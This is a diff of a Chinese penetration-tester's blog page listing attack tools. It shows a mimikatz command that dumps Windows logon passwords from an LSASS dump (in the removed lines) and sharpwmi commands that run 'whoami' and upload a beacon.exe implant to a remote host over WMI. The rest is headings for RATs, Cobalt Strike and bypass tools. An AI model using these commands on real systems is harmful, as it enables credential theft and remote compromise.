@@ -20,15 +20,15 @@
     var CONFIG = {"hostname":"zsjevilhex.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":10,"unescape":true,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="收集的部分工具">
+  <meta name="description" content="tools">
 <meta property="og:type" content="article">
-<meta property="og:title" content="工具使用说明">
+<meta property="og:title" content="tools">
 <meta property="og:url" content="http://zsjevilhex.github.io/archives/2020/04/14/tools-usage/index.html">
 <meta property="og:site_name" content="evilhex">
-<meta property="og:description" content="收集的部分工具">
+<meta property="og:description" content="tools">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2020-04-14T15:02:21.000Z">
-<meta property="article:modified_time" content="2020-04-16T11:19:12.661Z">
+<meta property="article:modified_time" content="2020-04-16T15:52:31.721Z">
 <meta property="article:author" content="evilhex">
 <meta property="article:tag" content="tools">
 <meta name="twitter:card" content="summary">
@@ -46,7 +46,7 @@
   };
 </script>
 
-  <title>工具使用说明 | evilhex</title>
+  <title>tools | evilhex</title>
   
 
 
@@ -161,7 +161,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          工具使用说明
+          tools
         </h1>
 
         <div class="post-meta">
@@ -170,7 +170,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-04-16 19:19:12" itemprop="dateModified" datetime="2020-04-16T19:19:12+08:00">2020-04-16</time>
+                <time title="Modified: 2020-04-16 23:52:31" itemprop="dateModified" datetime="2020-04-16T23:52:31+08:00">2020-04-16</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -190,7 +190,7 @@
               <span class="post-meta-item-text">Views: </span>
               <span id="busuanzi_value_page_pv"></span>
             </span>
-            <div class="post-description">收集的部分工具</div>
+            <div class="post-description">tools</div>
 
         </div>
       </header>
@@ -201,12 +201,9 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="0、vuln-tools"><a href="#0、vuln-tools" class="headerlink" title="0、vuln-tools"></a>0、vuln-tools</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"sekurlsa::minidump lsass.dmp"</span> <span class="string">"sekurlsa::logonPasswords full"</span> <span class="built_in">exit</span> &gt;password.txt</span><br></pre></td></tr></table></figure>
-
-<h2 id="2、penetration-tools"><a href="#2、penetration-tools" class="headerlink" title="2、penetration-tools"></a>2、penetration-tools</h2><h3 id="2-5、DomainTools"><a href="#2-5、DomainTools" class="headerlink" title="2.5、DomainTools"></a>2.5、DomainTools</h3><h4 id="2-5-8、sharpwmi-exe"><a href="#2-5-8、sharpwmi-exe" class="headerlink" title="2.5.8、sharpwmi.exe"></a>2.5.8、sharpwmi.exe</h4><p><font size=3>使用说明: 通过135端口远程执行命令、上传文件等，依赖powershell、不依赖139和445端口，原理是将内容存储在对方机器注册表中，所以最长不能超过512kb</font><br><font size=3>使用方法: <a href="https://github.com/QAX-A-Team/sharpwmi" target="_blank" rel="noopener">ref</a></font></p>
+        <h2 id="0、setup-tools"><a href="#0、setup-tools" class="headerlink" title="0、setup-tools"></a>0、setup-tools</h2><h2 id="1、RAT："><a href="#1、RAT：" class="headerlink" title="1、RAT："></a>1、RAT：</h2><h3 id="001-RAT-000-Config-RAT"><a href="#001-RAT-000-Config-RAT" class="headerlink" title="[001]RAT/[000]Config-RAT:"></a>[001]RAT/[000]Config-RAT:</h3><h3 id="001-RAT-001-C-horse"><a href="#001-RAT-001-C-horse" class="headerlink" title="[001]RAT/[001]C-horse:"></a>[001]RAT/[001]C-horse:</h3><h3 id="001-RAT-002-AntSword"><a href="#001-RAT-002-AntSword" class="headerlink" title="[001]RAT/[002]AntSword:"></a>[001]RAT/[002]AntSword:</h3><h3 id="001-RAT-004-CobaltStrike"><a href="#001-RAT-004-CobaltStrike" class="headerlink" title="[001]RAT/[004]CobaltStrike:"></a>[001]RAT/[004]CobaltStrike:</h3><h2 id="2、渗透"><a href="#2、渗透" class="headerlink" title="2、渗透:"></a>2、渗透:</h2><h3 id="002-渗透-000-GetWindowsPass"><a href="#002-渗透-000-GetWindowsPass" class="headerlink" title="[002]渗透/[000]GetWindowsPass:"></a>[002]渗透/[000]GetWindowsPass:</h3><h3 id="002-渗透-001-GetInfoByPC"><a href="#002-渗透-001-GetInfoByPC" class="headerlink" title="[002]渗透/[001]GetInfoByPC:"></a>[002]渗透/[001]GetInfoByPC:</h3><h3 id="002-渗透-002-GetPass"><a href="#002-渗透-002-GetPass" class="headerlink" title="[002]渗透/[002]GetPass:"></a>[002]渗透/[002]GetPass:</h3><h3 id="002-渗透-003-ExchangeTools"><a href="#002-渗透-003-ExchangeTools" class="headerlink" title="[002]渗透/[003]ExchangeTools:"></a>[002]渗透/[003]ExchangeTools:</h3><h3 id="002-渗透-004-porttrans"><a href="#002-渗透-004-porttrans" class="headerlink" title="[002]渗透/[004]porttrans:"></a>[002]渗透/[004]porttrans:</h3><h3 id="002-渗透-005-DomainTools"><a href="#002-渗透-005-DomainTools" class="headerlink" title="[002]渗透/[005]DomainTools:"></a>[002]渗透/[005]DomainTools:</h3><h4 id="2-5-8、sharpwmi-exe"><a href="#2-5-8、sharpwmi-exe" class="headerlink" title="2.5.8、sharpwmi.exe"></a>2.5.8、sharpwmi.exe</h4><p><font size=3>使用说明: 通过135端口远程执行命令、上传文件等，依赖powershell、不依赖139和445端口，原理是将内容存储在对方机器注册表中，所以最长不能超过512kb</font><br><font size=3>使用方法: <a href="https://github.com/QAX-A-Team/sharpwmi" target="_blank" rel="noopener">ref</a></font></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sharpwmi.exe 192.168.2.3 administrator 123 cmd whoami  <span class="comment">#执行命令</span></span><br><span class="line">sharpwmi.exe 192.168.2.3 administrator 123 upload beacon.exe c:\beacon.exe   <span class="comment">#上传文件</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="3、setup-tools"><a href="#3、setup-tools" class="headerlink" title="3、setup-tools"></a>3、setup-tools</h2>
+<h3 id="002-渗透-006-ScanTools"><a href="#002-渗透-006-ScanTools" class="headerlink" title="[002]渗透/[006]ScanTools:"></a>[002]渗透/[006]ScanTools:</h3><h3 id="002-渗透-007-GetInfoByWeb"><a href="#002-渗透-007-GetInfoByWeb" class="headerlink" title="[002]渗透/[007]GetInfoByWeb:"></a>[002]渗透/[007]GetInfoByWeb:</h3><h3 id="002-渗透-008-NetWorkTools"><a href="#002-渗透-008-NetWorkTools" class="headerlink" title="[002]渗透/[008]NetWorkTools:"></a>[002]渗透/[008]NetWorkTools:</h3><h3 id="002-渗透-008-NetWorkTools-000-WgetForWindows"><a href="#002-渗透-008-NetWorkTools-000-WgetForWindows" class="headerlink" title="[002]渗透/[008]NetWorkTools/[000]WgetForWindows:"></a>[002]渗透/[008]NetWorkTools/[000]WgetForWindows:</h3><h3 id="002-渗透-008-NetWorkTools-001-Putty-amp-Plink-amp-Psftp"><a href="#002-渗透-008-NetWorkTools-001-Putty-amp-Plink-amp-Psftp" class="headerlink" title="[002]渗透/[008]NetWorkTools/[001]Putty&amp;Plink&amp;Psftp:"></a>[002]渗透/[008]NetWorkTools/[001]Putty&amp;Plink&amp;Psftp:</h3><h3 id="002-渗透-008-NetWorkTools-002-NcForWin"><a href="#002-渗透-008-NetWorkTools-002-NcForWin" class="headerlink" title="[002]渗透/[008]NetWorkTools/[002]NcForWin:"></a>[002]渗透/[008]NetWorkTools/[002]NcForWin:</h3><h3 id="002-渗透-009-ByPassTools"><a href="#002-渗透-009-ByPassTools" class="headerlink" title="[002]渗透/[009]ByPassTools:"></a>[002]渗透/[009]ByPassTools:</h3><h2 id="3、Brute"><a href="#3、Brute" class="headerlink" title="3、Brute:"></a>3、Brute:</h2><h2 id="4、vuln"><a href="#4、vuln" class="headerlink" title="4、vuln:"></a>4、vuln:</h2>
     </div>
 
     
@@ -289,7 +286,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0、vuln-tools"><span class="nav-number">1.</span> <span class="nav-text">0、vuln-tools</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2、penetration-tools"><span class="nav-number">2.</span> <span class="nav-text">2、penetration-tools</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5、DomainTools"><span class="nav-number">2.1.</span> <span class="nav-text">2.5、DomainTools</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-5-8、sharpwmi-exe"><span class="nav-number">2.1.1.</span> <span class="nav-text">2.5.8、sharpwmi.exe</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3、setup-tools"><span class="nav-number">3.</span> <span class="nav-text">3、setup-tools</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0、setup-tools"><span class="nav-number">1.</span> <span class="nav-text">0、setup-tools</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1、RAT："><span class="nav-number">2.</span> <span class="nav-text">1、RAT：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#001-RAT-000-Config-RAT"><span class="nav-number">2.1.</span> <span class="nav-text">[001]RAT&#x2F;[000]Config-RAT:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#001-RAT-001-C-horse"><span class="nav-number">2.2.</span> <span class="nav-text">[001]RAT&#x2F;[001]C-horse:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#001-RAT-002-AntSword"><span class="nav-number">2.3.</span> <span class="nav-text">[001]RAT&#x2F;[002]AntSword:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#001-RAT-004-CobaltStrike"><span class="nav-number">2.4.</span> <span class="nav-text">[001]RAT&#x2F;[004]CobaltStrike:</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2、渗透"><span class="nav-number">3.</span> <span class="nav-text">2、渗透:</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#002-渗透-000-GetWindowsPass"><span class="nav-number">3.1.</span> <span class="nav-text">[002]渗透&#x2F;[000]GetWindowsPass:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#002-渗透-001-GetInfoByPC"><span class="nav-number">3.2.</span> <span class="nav-text">[002]渗透&#x2F;[001]GetInfoByPC:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#002-渗透-002-GetPass"><span class="nav-number">3.3.</span> <span class="nav-text">[002]渗透&#x2F;[002]GetPass:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#002-渗透-003-ExchangeTools"><span class="nav-number">3.4.</span> <span class="nav-text">[002]渗透&#x2F;[003]ExchangeTools:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#002-渗透-004-porttrans"><span class="nav-number">3.5.</span> <span class="nav-text">[002]渗透&#x2F;[004]porttrans:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#002-渗透-005-DomainTools"><span class="nav-number">3.6.</span> <span class="nav-text">[002]渗透&#x2F;[005]DomainTools:</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-5-8、sharpwmi-exe"><span class="nav-number">3.6.1.</span> <span class="nav-text">2.5.8、sharpwmi.exe</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#002-渗透-006-ScanTools"><span class="nav-number">3.7.</span> <span class="nav-text">[002]渗透&#x2F;[006]ScanTools:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#002-渗透-007-GetInfoByWeb"><span class="nav-number">3.8.</span> <span class="nav-text">[002]渗透&#x2F;[007]GetInfoByWeb:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#002-渗透-008-NetWorkTools"><span class="nav-number">3.9.</span> <span class="nav-text">[002]渗透&#x2F;[008]NetWorkTools:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#002-渗透-008-NetWorkTools-000-WgetForWindows"><span class="nav-number">3.10.</span> <span class="nav-text">[002]渗透&#x2F;[008]NetWorkTools&#x2F;[000]WgetForWindows:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#002-渗透-008-NetWorkTools-001-Putty-amp-Plink-amp-Psftp"><span class="nav-number">3.11.</span> <span class="nav-text">[002]渗透&#x2F;[008]NetWorkTools&#x2F;[001]Putty&amp;Plink&amp;Psftp:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#002-渗透-008-NetWorkTools-002-NcForWin"><span class="nav-number">3.12.</span> <span class="nav-text">[002]渗透&#x2F;[008]NetWorkTools&#x2F;[002]NcForWin:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#002-渗透-009-ByPassTools"><span class="nav-number">3.13.</span> <span class="nav-text">[002]渗透&#x2F;[009]ByPassTools:</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3、Brute"><span class="nav-number">4.</span> <span class="nav-text">3、Brute:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4、vuln"><span class="nav-number">5.</span> <span class="nav-text">4、vuln:</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -305,7 +302,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-count">9</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -314,7 +311,7 @@
         <span class="site-state-item-name">categories</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">tags</span>
       </div>
   </nav>
